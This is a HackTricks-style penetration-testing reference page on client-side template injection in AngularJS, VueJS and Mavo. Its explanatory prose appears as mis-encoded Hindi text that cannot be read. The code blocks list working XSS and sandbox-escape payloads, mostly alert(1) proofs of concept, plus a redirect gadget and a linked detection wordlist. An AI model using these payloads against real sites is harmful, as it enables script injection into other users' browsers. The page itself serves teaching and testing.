# Client Side Template Injection (CSTI)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**рдореЛрдмрд╛рдЗрд▓ рд╕реБрд░рдХреНрд╖рд╛** рдореЗрдВ рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖рдЬреНрдЮрддрд╛ рдХреЛ 8kSec рдЕрдХрд╛рджрдореА рдХреЗ рд╕рд╛рде рдЧрд╣рд░рд╛ рдХрд░реЗрдВред рд╣рдорд╛рд░реЗ рдЖрддреНрдо-рдЧрддрд┐ рдкрд╛рдареНрдпрдХреНрд░рдореЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ iOS рдФрд░ Android рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдорд╣рд╛рд░рдд рд╣рд╛рд╕рд┐рд▓ рдХрд░реЗрдВ рдФрд░ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрдВ:

{% embed url="https://academy.8ksec.io/" %}

## рд╕рд╛рд░рд╛рдВрд╢

рдпрд╣ [**рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди**](ssti-server-side-template-injection/) рдХреА рддрд░рд╣ рд╣реИ рд▓реЗрдХрд┐рди **рдХреНрд▓рд╛рдЗрдВрдЯ** рдореЗрдВред **SSTI** рдЖрдкрдХреЛ **рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░** рдкрд░ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ, **CSTI** рдЖрдкрдХреЛ **рд╢рд┐рдХрд╛рд░ рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░** рдореЗрдВ **рдордирдорд╛рдирд╛ JavaScript** рдХреЛрдб **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХреЗ рд▓рд┐рдП **рдкрд░реАрдХреНрд╖рдг** **SSTI** рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдмрд╣реБрдд **рд╕рдорд╛рди** рд╣реИ, рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ **рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ** рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ `{{ 7-7 }}` рдХреЗ рд╕рд╛рде, рдпрджрд┐ рдРрдк **рдХрдордЬреЛрд░** рд╣реИ рддреЛ рдЖрдк `0` рджреЗрдЦреЗрдВрдЧреЗ, рдФрд░ рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рдЖрдк рдореВрд▓ рджреЗрдЦреЗрдВрдЧреЗ: `{{ 7-7 }}`

## AngularJS

AngularJS рдПрдХ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ JavaScript рдврд╛рдВрдЪрд╛ рд╣реИ рдЬреЛ HTML рдХреЗ рд╕рд╛рде рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдиреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп **`ng-app`** рд╣реИред рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ AngularJS рдХреЛ HTML рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдбрдмрд▓ рдХрд░реНрд▓реА рдмреНрд░реЗрд╕реЗрд╕ рдХреЗ рдЕрдВрджрд░ JavaScript рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред

рдРрд╕реЗ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЛ `ng-app` рдЯреИрдЧ рдХреЗ рд╕рд╛рде HTML рдмреЙрдбреА рдореЗрдВ рдЧрддрд┐рд╢реАрд▓ рд░реВрдк рд╕реЗ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдордирдорд╛рдирд╛ JavaScript рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред рдпрд╣ рдЗрдирдкреБрдЯ рдХреЗ рднреАрддрд░ AngularJS рдХреА рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдиреАрдЪреЗ рдЙрджрд╛рд╣рд░рдг рджрд┐рдП рдЧрдП рд╣реИрдВ рдЬреЛ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ JavaScript рдХреЛрдб рдХреИрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
рдЖрдк рдЗрд╕ **рдмреБрдирд┐рдпрд╛рджреА рдСрдирд▓рд╛рдЗрди рдЙрджрд╛рд╣рд░рдг** рдХреЛ **AngularJS** рдореЗрдВ рдЗрд╕ рд▓рд┐рдВрдХ рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ [http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/) рдФрд░ [**Burp Suite Academy**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression) рдореЗрдВред

{% hint style="danger" %}
[**Angular 1.6 рдиреЗ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╣рдЯрд╛ рджрд┐рдпрд╛**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) рдЗрд╕рд▓рд┐рдП рдЗрд╕ рд╕рдВрд╕реНрдХрд░рдг рд╕реЗ рдПрдХ рдкреЗрд▓реЛрдб рдЬреИрд╕реЗ `{{constructor.constructor('alert(1)')()}}` рдпрд╛ `<input ng-focus=$event.view.alert('XSS')>` рдХрд╛рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
{% endhint %}

## VueJS

рдЖрдк рдПрдХ **рдХрдордЬреЛрд░ Vue** рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдЗрд╕ рд▓рд┐рдВрдХ рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)\
рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреЗрд▓реЛрдб: [`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor\(%27alert\(%22foo%22\)%27\)\(\)%7D%7D)

рдФрд░ рдХрдордЬреЛрд░ рдЙрджрд╛рд╣рд░рдг рдХрд╛ **рд╕реНрд░реЛрдд рдХреЛрдб** рдпрд╣рд╛рдБ рд╣реИ: [https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)
```markup
<!-- Google Research - Vue.js-->
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
```
рдПрдХ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЕрдЪреНрдЫрд╛ рдкреЛрд╕реНрдЯ CSTI рдкрд░ VUE рдореЗрдВ [https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets) рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **V3**
```
{{_openBlock.constructor('alert(1)')()}}
```
Credit: [Gareth Heyes, Lewis Ardern & PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

### **V2**
```
{{constructor.constructor('alert(1)')()}}
```
Credit: [Mario Heiderich](https://twitter.com/cure53berlin)

**рдЕрдзрд┐рдХ VUE рдкреЗрд▓реЛрдбреНрд╕ рджреЗрдЦреЗрдВ** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)

## Mavo

Payload:
```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```
**More payloads in** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

## **Brute-Force Detection List**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**рдореЛрдмрд╛рдЗрд▓ рд╕реБрд░рдХреНрд╖рд╛** рдореЗрдВ рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖рдЬреНрдЮрддрд╛ рдХреЛ рдЧрд╣рд░рд╛ рдХрд░реЗрдВ 8kSec рдЕрдХрд╛рджрдореА рдХреЗ рд╕рд╛рдеред рд╣рдорд╛рд░реЗ рдЖрддреНрдо-рдЧрддрд┐ рдкрд╛рдареНрдпрдХреНрд░рдореЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ iOS рдФрд░ Android рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдорд╣рд╛рд░рдд рд╣рд╛рд╕рд┐рд▓ рдХрд░реЗрдВ рдФрд░ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрдВ:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
